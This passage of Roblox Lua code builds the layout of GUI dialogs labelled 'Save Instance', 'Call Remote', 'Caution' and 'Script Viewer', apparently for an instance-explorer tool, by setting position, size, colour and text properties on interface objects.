		NewGuiPart38.Visible = false
		NewGuiPart38.ZIndex = 2

		NewGuiPart39.Name = "Title"
		NewGuiPart39.Parent = NewGuiPart38
		NewGuiPart39.BackgroundTransparency = 1
		NewGuiPart39.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart39.ZIndex = 2
		NewGuiPart39.Font = Enum.Font.SourceSans
		NewGuiPart39.FontSize = Enum.FontSize.Size14
		NewGuiPart39.Text = "Save Instance"
		NewGuiPart39.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart39.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart40.Name = "MainWindow"
		NewGuiPart40.Parent = NewGuiPart38
		NewGuiPart40.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart40.BackgroundTransparency = 0.10000000149012
		NewGuiPart40.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart40.Size = UDim2.new(1, 0, 0, 200)

		NewGuiPart41.Name = "Save"
		NewGuiPart41.Parent = NewGuiPart40
		NewGuiPart41.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart41.BackgroundTransparency = 0.5
		NewGuiPart41.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart41.Position = UDim2.new(0.075000003, 0, 1, -40)
		NewGuiPart41.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart41.Font = Enum.Font.SourceSans
		NewGuiPart41.FontSize = Enum.FontSize.Size18
		NewGuiPart41.Text = "Save"

		NewGuiPart42.Name = "Desc"
		NewGuiPart42.Parent = NewGuiPart40
		NewGuiPart42.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart42.BackgroundTransparency = 1
		NewGuiPart42.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart42.Size = UDim2.new(1, 0, 0, 40)
		NewGuiPart42.Font = Enum.Font.SourceSans
		NewGuiPart42.FontSize = Enum.FontSize.Size14
		NewGuiPart42.Text = "This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)"
		NewGuiPart42.TextWrapped = true

		NewGuiPart43.Name = "Cancel"
		NewGuiPart43.Parent = NewGuiPart40
		NewGuiPart43.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart43.BackgroundTransparency = 0.5
		NewGuiPart43.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart43.Position = UDim2.new(0.524999976, 0, 1, -40)
		NewGuiPart43.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart43.Font = Enum.Font.SourceSans
		NewGuiPart43.FontSize = Enum.FontSize.Size18
		NewGuiPart43.Text = "Cancel"

		NewGuiPart44.Name = "FileName"
		NewGuiPart44.Parent = NewGuiPart40
		NewGuiPart44.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart44.BackgroundTransparency = 0.20000000298023
		NewGuiPart44.Position = UDim2.new(0.075000003, 0, 0.400000006, 0)
		NewGuiPart44.Size = UDim2.new(0.850000024, 0, 0, 30)
		NewGuiPart44.Font = Enum.Font.SourceSans
		NewGuiPart44.FontSize = Enum.FontSize.Size18
		NewGuiPart44.Text = ""
		NewGuiPart44.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart45.Name = "SaveObjects"
		NewGuiPart45.Parent = NewGuiPart40
		NewGuiPart45.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart45.BackgroundTransparency = 0.60000002384186
		NewGuiPart45.Position = UDim2.new(0.075000003, 0, 0.625, 0)
		NewGuiPart45.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart45.ZIndex = 2
		NewGuiPart45.Font = Enum.Font.SourceSans
		NewGuiPart45.FontSize = Enum.FontSize.Size18
		NewGuiPart45.Text = ""
		NewGuiPart45.TextColor3 = Color3.new(1, 1, 1)

		NewGuiPart46.Name = "enabled"
		NewGuiPart46.Parent = NewGuiPart45
		NewGuiPart46.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
		NewGuiPart46.BackgroundTransparency = 0.40000000596046
		NewGuiPart46.BorderSizePixel = 0
		NewGuiPart46.Position = UDim2.new(0, 3, 0, 3)
		NewGuiPart46.Size = UDim2.new(0, 14, 0, 14)
		NewGuiPart46.Font = Enum.Font.SourceSans
		NewGuiPart46.FontSize = Enum.FontSize.Size14
		NewGuiPart46.Text = ""

		NewGuiPart47.Name = "Desc2"
		NewGuiPart47.Parent = NewGuiPart40
		NewGuiPart47.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart47.BackgroundTransparency = 1
		NewGuiPart47.Position = UDim2.new(0.075000003, 30, 0.625, 0)
		NewGuiPart47.Size = UDim2.new(0.925000012, -30, 0, 20)
		NewGuiPart47.Font = Enum.Font.SourceSans
		NewGuiPart47.FontSize = Enum.FontSize.Size14
		NewGuiPart47.Text = "Save \"Object\" type values"
		NewGuiPart47.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart48.Name = "Confirmation"
		NewGuiPart48.Parent = NewGuiPart1
		NewGuiPart48.Active = true
		NewGuiPart48.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart48.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart48.Draggable = true
		NewGuiPart48.Position = UDim2.new(0.300000012, 0, 0.349999994, 0)
		NewGuiPart48.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart48.Visible = false
		NewGuiPart48.ZIndex = 3

		NewGuiPart49.Name = "Title"
		NewGuiPart49.Parent = NewGuiPart48
		NewGuiPart49.BackgroundTransparency = 1
		NewGuiPart49.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart49.ZIndex = 3
		NewGuiPart49.Font = Enum.Font.SourceSans
		NewGuiPart49.FontSize = Enum.FontSize.Size14
		NewGuiPart49.Text = "Confirm"
		NewGuiPart49.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart49.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart50.Name = "MainWindow"
		NewGuiPart50.Parent = NewGuiPart48
		NewGuiPart50.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart50.BackgroundTransparency = 0.10000000149012
		NewGuiPart50.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart50.Size = UDim2.new(1, 0, 0, 150)
		NewGuiPart50.ZIndex = 2

		NewGuiPart51.Name = "Yes"
		NewGuiPart51.Parent = NewGuiPart50
		NewGuiPart51.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart51.BackgroundTransparency = 0.5
		NewGuiPart51.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart51.Position = UDim2.new(0.075000003, 0, 1, -40)
		NewGuiPart51.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart51.ZIndex = 2
		NewGuiPart51.Font = Enum.Font.SourceSans
		NewGuiPart51.FontSize = Enum.FontSize.Size18
		NewGuiPart51.Text = "Yes"

		NewGuiPart52.Name = "Desc"
		NewGuiPart52.Parent = NewGuiPart50
		NewGuiPart52.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart52.BackgroundTransparency = 1
		NewGuiPart52.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart52.Size = UDim2.new(1, 0, 0, 40)
		NewGuiPart52.ZIndex = 2
		NewGuiPart52.Font = Enum.Font.SourceSans
		NewGuiPart52.FontSize = Enum.FontSize.Size14
		NewGuiPart52.Text = "The file, FILENAME, already exists. Overwrite?"
		NewGuiPart52.TextWrapped = true

		NewGuiPart53.Name = "No"
		NewGuiPart53.Parent = NewGuiPart50
		NewGuiPart53.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart53.BackgroundTransparency = 0.5
		NewGuiPart53.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart53.Position = UDim2.new(0.524999976, 0, 1, -40)
		NewGuiPart53.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart53.ZIndex = 2
		NewGuiPart53.Font = Enum.Font.SourceSans
		NewGuiPart53.FontSize = Enum.FontSize.Size18
		NewGuiPart53.Text = "No"

		NewGuiPart54.Name = "Caution"
		NewGuiPart54.Parent = NewGuiPart1
		NewGuiPart54.Active = true
		NewGuiPart54.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart54.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart54.Draggable = true
		NewGuiPart54.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart54.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart54.Visible = false
		NewGuiPart54.ZIndex = 5

		NewGuiPart55.Name = "Title"
		NewGuiPart55.Parent = NewGuiPart54
		NewGuiPart55.BackgroundTransparency = 1
		NewGuiPart55.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart55.ZIndex = 5
		NewGuiPart55.Font = Enum.Font.SourceSans
		NewGuiPart55.FontSize = Enum.FontSize.Size14
		NewGuiPart55.Text = "Caution"
		NewGuiPart55.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart55.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart56.Name = "MainWindow"
		NewGuiPart56.Parent = NewGuiPart54
		NewGuiPart56.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart56.BackgroundTransparency = 0.10000000149012
		NewGuiPart56.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart56.Size = UDim2.new(1, 0, 0, 150)
		NewGuiPart56.ZIndex = 4

		NewGuiPart57.Name = "Desc"
		NewGuiPart57.Parent = NewGuiPart56
		NewGuiPart57.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart57.BackgroundTransparency = 1
		NewGuiPart57.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart57.Size = UDim2.new(1, 0, 0, 42)
		NewGuiPart57.ZIndex = 4
		NewGuiPart57.Font = Enum.Font.SourceSans
		NewGuiPart57.FontSize = Enum.FontSize.Size14
		NewGuiPart57.Text = "The file, FILENAME, already exists. Overwrite?"
		NewGuiPart57.TextWrapped = true

		NewGuiPart58.Name = "Ok"
		NewGuiPart58.Parent = NewGuiPart56
		NewGuiPart58.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart58.BackgroundTransparency = 0.5
		NewGuiPart58.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart58.Position = UDim2.new(0.300000012, 0, 1, -40)
		NewGuiPart58.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart58.ZIndex = 4
		NewGuiPart58.Font = Enum.Font.SourceSans
		NewGuiPart58.FontSize = Enum.FontSize.Size18
		NewGuiPart58.Text = "Ok"

		NewGuiPart59.Name = "CallRemote"
		NewGuiPart59.Parent = NewGuiPart1
		NewGuiPart59.Active = true
		NewGuiPart59.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart59.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart59.Draggable = true
		NewGuiPart59.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart59.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart59.Visible = false
		NewGuiPart59.ZIndex = 2

		NewGuiPart60.Name = "Title"
		NewGuiPart60.Parent = NewGuiPart59
		NewGuiPart60.BackgroundTransparency = 1
		NewGuiPart60.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart60.ZIndex = 2
		NewGuiPart60.Font = Enum.Font.SourceSans
		NewGuiPart60.FontSize = Enum.FontSize.Size14
		NewGuiPart60.Text = "Call Remote"
		NewGuiPart60.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart60.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart61.Name = "MainWindow"
		NewGuiPart61.Parent = NewGuiPart59
		NewGuiPart61.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart61.BackgroundTransparency = 0.10000000149012
		NewGuiPart61.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart61.Size = UDim2.new(1, 0, 0, 200)

		NewGuiPart62.Name = "Desc"
		NewGuiPart62.Parent = NewGuiPart61
		NewGuiPart62.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart62.BackgroundTransparency = 1
		NewGuiPart62.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart62.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart62.Font = Enum.Font.SourceSans
		NewGuiPart62.FontSize = Enum.FontSize.Size14
		NewGuiPart62.Text = "Arguments"
		NewGuiPart62.TextWrapped = true

		NewGuiPart63.Name = "Arguments"
		NewGuiPart63.Parent = NewGuiPart61
		NewGuiPart63.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart63.BackgroundTransparency = 1
		NewGuiPart63.Position = UDim2.new(0, 0, 0, 40)
		NewGuiPart63.Size = UDim2.new(1, 0, 0, 80)
		NewGuiPart63.BottomImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart63.CanvasSize = UDim2.new(0, 0, 0, 0)
		NewGuiPart63.MidImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart63.TopImage = "rbxasset://textures/blackBkg_square.png"

		NewGuiPart64.Name = "DisplayReturned"
		NewGuiPart64.Parent = NewGuiPart61
		NewGuiPart64.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart64.BackgroundTransparency = 0.60000002384186
		NewGuiPart64.Position = UDim2.new(0.075000003, 0, 0.625, 0)
		NewGuiPart64.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart64.ZIndex = 2
		NewGuiPart64.Font = Enum.Font.SourceSans
		NewGuiPart64.FontSize = Enum.FontSize.Size18
		NewGuiPart64.Text = ""
		NewGuiPart64.TextColor3 = Color3.new(1, 1, 1)

		NewGuiPart65.Name = "enabled"
		NewGuiPart65.Parent = NewGuiPart64
		NewGuiPart65.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
		NewGuiPart65.BackgroundTransparency = 0.40000000596046
		NewGuiPart65.BorderSizePixel = 0
		NewGuiPart65.Position = UDim2.new(0, 3, 0, 3)
		NewGuiPart65.Size = UDim2.new(0, 14, 0, 14)
		NewGuiPart65.Visible = false
		NewGuiPart65.Font = Enum.Font.SourceSans
		NewGuiPart65.FontSize = Enum.FontSize.Size14
		NewGuiPart65.Text = ""

		NewGuiPart66.Name = "Desc2"
		NewGuiPart66.Parent = NewGuiPart61
		NewGuiPart66.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart66.BackgroundTransparency = 1
		NewGuiPart66.Position = UDim2.new(0.075000003, 30, 0.625, 0)
		NewGuiPart66.Size = UDim2.new(0.925000012, -30, 0, 20)
		NewGuiPart66.Font = Enum.Font.SourceSans
		NewGuiPart66.FontSize = Enum.FontSize.Size14
		NewGuiPart66.Text = "Display values returned"
		NewGuiPart66.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart67.Name = "Add"
		NewGuiPart67.Parent = NewGuiPart61
		NewGuiPart67.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart67.BackgroundTransparency = 0.5
		NewGuiPart67.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart67.Position = UDim2.new(0.800000012, 0, 0.625, 0)
		NewGuiPart67.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart67.Font = Enum.Font.SourceSansBold
		NewGuiPart67.FontSize = Enum.FontSize.Size24
		NewGuiPart67.Text = "+"

		NewGuiPart68.Name = "Subtract"
		NewGuiPart68.Parent = NewGuiPart61
		NewGuiPart68.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart68.BackgroundTransparency = 0.5
		NewGuiPart68.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart68.Position = UDim2.new(0.899999976, 0, 0.625, 0)
		NewGuiPart68.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart68.Font = Enum.Font.SourceSansBold
		NewGuiPart68.FontSize = Enum.FontSize.Size24
		NewGuiPart68.Text = "-"

		NewGuiPart69.Name = "ArgumentTemplate"
		NewGuiPart69.Parent = NewGuiPart61
		NewGuiPart69.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart69.BackgroundTransparency = 0.5
		NewGuiPart69.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart69.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart69.Visible = false

		NewGuiPart70.Name = "Type"
		NewGuiPart70.Parent = NewGuiPart69
		NewGuiPart70.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart70.BackgroundTransparency = 0.89999997615814
		NewGuiPart70.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart70.Size = UDim2.new(0.400000006, 0, 0, 20)
		NewGuiPart70.Font = Enum.Font.SourceSans
		NewGuiPart70.FontSize = Enum.FontSize.Size18
		NewGuiPart70.Text = "Script"

		NewGuiPart71.Name = "Value"
		NewGuiPart71.Parent = NewGuiPart69
		NewGuiPart71.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart71.BackgroundTransparency = 0.89999997615814
		NewGuiPart71.Position = UDim2.new(0.400000006, 0, 0, 0)
		NewGuiPart71.Size = UDim2.new(0.600000024, -12, 0, 20)
		NewGuiPart71.Font = Enum.Font.SourceSans
		NewGuiPart71.FontSize = Enum.FontSize.Size14
		NewGuiPart71.Text = ""
		NewGuiPart71.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart72.Name = "Cancel"
		NewGuiPart72.Parent = NewGuiPart61
		NewGuiPart72.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart72.BackgroundTransparency = 0.5
		NewGuiPart72.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart72.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart72.Font = Enum.Font.SourceSans
		NewGuiPart72.FontSize = Enum.FontSize.Size18
		NewGuiPart72.Text = "Cancel"

		NewGuiPart73.Name = "Ok"
		NewGuiPart73.Parent = NewGuiPart61
		NewGuiPart73.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart73.BackgroundTransparency = 0.5
		NewGuiPart73.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart73.Position = UDim2.new(0.075000003, 0, 1, -40)
		NewGuiPart73.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart73.Font = Enum.Font.SourceSans
		NewGuiPart73.FontSize = Enum.FontSize.Size18
		NewGuiPart73.Text = "Call"

		NewGuiPart74.Name = "TableCaution"
		NewGuiPart74.Parent = NewGuiPart1
		NewGuiPart74.Active = true
		NewGuiPart74.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart74.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart74.Draggable = true
		NewGuiPart74.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart74.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart74.Visible = false
		NewGuiPart74.ZIndex = 2

		NewGuiPart75.Name = "MainWindow"
		NewGuiPart75.Parent = NewGuiPart74
		NewGuiPart75.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart75.BackgroundTransparency = 0.10000000149012
		NewGuiPart75.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart75.Size = UDim2.new(1, 0, 0, 150)

		NewGuiPart76.Name = "Ok"
		NewGuiPart76.Parent = NewGuiPart75
		NewGuiPart76.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart76.BackgroundTransparency = 0.5
		NewGuiPart76.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart76.Position = UDim2.new(0.300000012, 0, 1, -40)
		NewGuiPart76.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart76.Font = Enum.Font.SourceSans
		NewGuiPart76.FontSize = Enum.FontSize.Size18
		NewGuiPart76.Text = "Ok"

		NewGuiPart77.Name = "TableResults"
		NewGuiPart77.Parent = NewGuiPart75
		NewGuiPart77.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart77.BackgroundTransparency = 1
		NewGuiPart77.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart77.Size = UDim2.new(1, 0, 0, 80)
		NewGuiPart77.BottomImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart77.CanvasSize = UDim2.new(0, 0, 0, 0)
		NewGuiPart77.MidImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart77.TopImage = "rbxasset://textures/blackBkg_square.png"

		NewGuiPart78.Name = "TableTemplate"
		NewGuiPart78.Parent = NewGuiPart75
		NewGuiPart78.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart78.BackgroundTransparency = 0.5
		NewGuiPart78.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart78.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart78.Visible = false

		NewGuiPart79.Name = "Type"
		NewGuiPart79.Parent = NewGuiPart78
		NewGuiPart79.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart79.BackgroundTransparency = 0.89999997615814
		NewGuiPart79.Size = UDim2.new(0.400000006, 0, 0, 20)
		NewGuiPart79.Font = Enum.Font.SourceSans
		NewGuiPart79.FontSize = Enum.FontSize.Size18
		NewGuiPart79.Text = "Script"

		NewGuiPart80.Name = "Value"
		NewGuiPart80.Parent = NewGuiPart78
		NewGuiPart80.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart80.BackgroundTransparency = 0.89999997615814
		NewGuiPart80.Position = UDim2.new(0.400000006, 0, 0, 0)
		NewGuiPart80.Size = UDim2.new(0.600000024, -12, 0, 20)
		NewGuiPart80.Font = Enum.Font.SourceSans
		NewGuiPart80.FontSize = Enum.FontSize.Size14
		NewGuiPart80.Text = "Script"

		NewGuiPart81.Name = "Title"
		NewGuiPart81.Parent = NewGuiPart74
		NewGuiPart81.BackgroundTransparency = 1
		NewGuiPart81.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart81.ZIndex = 2
		NewGuiPart81.Font = Enum.Font.SourceSans
		NewGuiPart81.FontSize = Enum.FontSize.Size14
		NewGuiPart81.Text = "Caution"
		NewGuiPart81.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart81.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart82.Name = "ScriptEditor"
		NewGuiPart82.Parent = NewGuiPart1
		NewGuiPart82.Active = true
		NewGuiPart82.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart82.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart82.Draggable = true
		NewGuiPart82.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart82.Size = UDim2.new(0, 516, 0, 20)
		NewGuiPart82.Visible = false
		NewGuiPart82.ZIndex = 5

		NewGuiPart163.Name = "OpenScript"
		NewGuiPart163.Parent = NewGuiPart82
		NewGuiPart163.Archivable = true

		NewGuiPart83.Name = "Title"
		NewGuiPart83.Parent = NewGuiPart82
		NewGuiPart83.BackgroundTransparency = 1
		NewGuiPart83.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart83.ZIndex = 5
		NewGuiPart83.Font = Enum.Font.SourceSans
		NewGuiPart83.FontSize = Enum.FontSize.Size14
		NewGuiPart83.Text = "Script Viewer"
		NewGuiPart83.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart83.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart84.Name = "Cover"
		NewGuiPart84.Parent = NewGuiPart82
		NewGuiPart84.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart84.BorderSizePixel = 0
		NewGuiPart84.Position = UDim2.new(0, 0, 3, 0)
		NewGuiPart84.Size = UDim2.new(0, 516, 0, 416)

		NewGuiPart85.Name = "EditorGrid"
		NewGuiPart85.Parent = NewGuiPart82
		NewGuiPart85.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart85.BorderSizePixel = 0
		NewGuiPart85.Position = UDim2.new(0, 0, 3, 0)
		NewGuiPart85.Size = UDim2.new(0, 500, 0, 400)

		NewGuiPart86.Name = "TopBar"
		NewGuiPart86.Parent = NewGuiPart82
		NewGuiPart86.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
		NewGuiPart86.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart86.Size = UDim2.new(1, 0, 3, 0)

		NewGuiPart87.Name = "ScriptBarLeft"
		NewGuiPart87.Parent = NewGuiPart86
		NewGuiPart87.Active = false
		NewGuiPart87.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
		NewGuiPart87.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart87.Position = UDim2.new(1, -32, 0, 40)
		NewGuiPart87.Size = UDim2.new(0, 16, 0, 20)
		NewGuiPart87.AutoButtonColor = false

		NewGuiPart88.Name = "Arrow Graphic"
		NewGuiPart88.Parent = NewGuiPart87
		NewGuiPart88.BackgroundTransparency = 1
		NewGuiPart88.BorderSizePixel = 0
		NewGuiPart88.Position = UDim2.new(0.5, -4, 0.5, -4)
		NewGuiPart88.Size = UDim2.new(0, 8, 0, 8)

		NewGuiPart89.Name = "Graphic"
		NewGuiPart89.Parent = NewGuiPart88
		NewGuiPart89.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart89.BackgroundTransparency = 0.69999998807907
		NewGuiPart89.BorderSizePixel = 0
		NewGuiPart89.Position = UDim2.new(0.25, 0, 0.375, 0)
		NewGuiPart89.Size = UDim2.new(0.125, 0, 0.25, 0)

		NewGuiPart90.Name = "Graphic"
		NewGuiPart90.Parent = NewGuiPart88
		NewGuiPart90.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart90.BackgroundTransparency = 0.69999998807907
		NewGuiPart90.BorderSizePixel = 0
		NewGuiPart90.Position = UDim2.new(0.375, 0, 0.25, 0)
		NewGuiPart90.Size = UDim2.new(0.125, 0, 0.5, 0)

		NewGuiPart91.Name = "Graphic"
		NewGuiPart91.Parent = NewGuiPart88
		NewGuiPart91.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart91.BackgroundTransparency = 0.69999998807907
		NewGuiPart91.BorderSizePixel = 0
		NewGuiPart91.Position = UDim2.new(0.5, 0, 0.125, 0)
		NewGuiPart91.Size = UDim2.new(0.125, 0, 0.75, 0)

		NewGuiPart92.Name = "Graphic"
		NewGuiPart92.Parent = NewGuiPart88
		NewGuiPart92.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart92.BackgroundTransparency = 0.69999998807907
		NewGuiPart92.BorderSizePixel = 0
		NewGuiPart92.Position = UDim2.new(0.625, 0, 0, 0)
		NewGuiPart92.Size = UDim2.new(0.125, 0, 1, 0)

		NewGuiPart93.Name = "ScriptBarRight"
		NewGuiPart93.Parent = NewGuiPart86
		NewGuiPart93.Active = false
		NewGuiPart93.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
		NewGuiPart93.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart93.Position = UDim2.new(1, -16, 0, 40)
		NewGuiPart93.Size = UDim2.new(0, 16, 0, 20)
		NewGuiPart93.AutoButtonColor = false

		NewGuiPart94.Name = "Arrow Graphic"
		NewGuiPart94.Parent = NewGuiPart93
		NewGuiPart94.BackgroundTransparency = 1
		NewGuiPart94.BorderSizePixel = 0
		NewGuiPart94.Position = UDim2.new(0.5, -4, 0.5, -4)
		NewGuiPart94.Size = UDim2.new(0, 8, 0, 8)

		NewGuiPart95.Name = "Graphic"
		NewGuiPart95.Parent = NewGuiPart94
		NewGuiPart95.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart95.BackgroundTransparency = 0.69999998807907
		NewGuiPart95.BorderSizePixel = 0
		NewGuiPart95.Position = UDim2.new(0.625, 0, 0.375, 0)
		NewGuiPart95.Size = UDim2.new(0.125, 0, 0.25, 0)

		NewGuiPart96.Name = "Graphic"
		NewGuiPart96.Parent = NewGuiPart94
		NewGuiPart96.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart96.BackgroundTransparency = 0.69999998807907
		NewGuiPart96.BorderSizePixel = 0
		NewGuiPart96.Position = UDim2.new(0.5, 0, 0.25, 0)
		NewGuiPart96.Size = UDim2.new(0.125, 0, 0.5, 0)

		NewGuiPart97.Name = "Graphic"
		NewGuiPart97.Parent = NewGuiPart94
		NewGuiPart97.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart97.BackgroundTransparency = 0.69999998807907
		NewGuiPart97.BorderSizePixel = 0
		NewGuiPart97.Position = UDim2.new(0.375, 0, 0.125, 0)
		NewGuiPart97.Size = UDim2.new(0.125, 0, 0.75, 0)

		NewGuiPart98.Name = "Graphic"
		NewGuiPart98.Parent = NewGuiPart94
		NewGuiPart98.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart98.BackgroundTransparency = 0.69999998807907
		NewGuiPart98.BorderSizePixel = 0
		NewGuiPart98.Position = UDim2.new(0.25, 0, 0, 0)
		NewGuiPart98.Size = UDim2.new(0.125, 0, 1, 0)

		NewGuiPart99.Name = "Clipboard"
		NewGuiPart99.Parent = NewGuiPart86
		NewGuiPart99.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart99.BackgroundTransparency = 0.5
		NewGuiPart99.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart99.Position = UDim2.new(0, 0, 0, 20)
